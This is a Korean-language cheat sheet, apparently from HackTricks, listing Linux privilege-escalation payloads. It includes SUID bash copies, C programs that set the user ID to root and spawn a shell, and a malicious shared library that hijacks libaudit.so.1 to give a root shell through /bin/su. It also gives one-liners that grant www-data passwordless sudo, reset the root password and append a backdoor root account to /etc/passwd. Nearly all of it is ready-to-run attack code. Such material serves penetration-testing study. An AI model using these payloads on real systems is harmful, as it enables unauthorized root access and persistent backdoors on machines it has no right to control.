# 실행할 Payload

{{#include ../../banners/hacktricks-training.md}}

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## 권한 상승을 위한 파일 덮어쓰기

### 일반적인 파일

- _/etc/passwd_에 비밀번호가 설정된 사용자 추가
- _/etc/shadow_ 내부의 비밀번호 변경
- _/etc/sudoers_의 sudoers에 사용자 추가
- 일반적으로 _/run/docker.sock_ 또는 _/var/run/docker.sock_에 있는 docker socket을 통해 docker 악용

### 라이브러리 덮어쓰기

일부 binary에서 사용하는 라이브러리를 확인합니다. 이 경우에는 `/bin/su`입니다:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
이 경우 `/lib/x86_64-linux-gnu/libaudit.so.1`를 impersonate해 보겠습니다.\
따라서 **`su`** binary가 사용하는 이 library의 function을 확인합니다:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_acct_message`, `audit_log_acct_message` 및 `audit_fd` 기호는 아마도 libaudit.so.1 라이브러리에서 가져온 것입니다. libaudit.so.1이 악성 shared library로 덮어써지므로, 새 shared library에 이러한 기호가 있어야 합니다. 그렇지 않으면 프로그램이 해당 기호를 찾지 못하고 종료됩니다.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
이제 **`/bin/su`**를 호출하기만 하면 root 셸을 얻을 수 있습니다.

## 스크립트

root가 무언가를 실행하도록 만들 수 있나요?

### **www-data에서 sudoers로**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **root 비밀번호 변경**
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd에 새 root user 추가
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
{{#include ../../banners/hacktricks-training.md}}
